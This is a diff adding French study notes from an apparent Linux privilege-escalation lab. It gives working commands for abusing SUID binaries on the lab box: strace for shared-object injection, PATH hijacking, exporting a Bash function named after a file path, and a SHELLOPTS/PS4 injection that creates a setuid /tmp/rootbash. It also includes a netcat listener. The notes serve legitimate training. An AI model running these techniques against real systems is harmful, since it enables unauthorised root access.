@@ -199,6 +199,8 @@ puis
 ```
 /tmp/rootbash -p
 ```
+<br>
+<br>
 
 ## Cron Jobs - Wildcard
 
@@ -231,3 +233,104 @@ chmod +x shell.elf
 ```
 nc -lnvp 1337
 ```
+<br>
+<br>
+
+## SUID / SGID Executables - Shared Object Injection
+
+Utiliser stracer pour voir les appels au objet partagé !
+
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+<br>
+<br>
+
+## SUID / SGID Executables - Environment Variables 
+
+Exemple
+
+```
+/usr/local/bin/suid-env
+```
+
+```
+user@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+```
+Créer un script qui fais spawn un shell en `C`.
+```
+gcc -o service /home/user/tools/suid/service.c
+```
+```
+PATH=.:$PATH /usr/local/bin/suid-env
+```
+<br>
+<br>
+
+## SUID / SGID Executables - Abusing Shell Features (#1) 
+
+```
+user@debian:~$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+```
+
+"In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path."
+
+```
+user@debian:~$ /bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+```
+
+```
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+```
+/usr/local/bin/suid-env2
+```
+
+<br>
+<br>
+
+## SUID / SGID Executables - Abusing Shell Features (#2)
+
+```
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+```
+/tmp/rootbash -p
+```
+NE MARCHE PAS AVEC BASH 4.4 ou plus récent
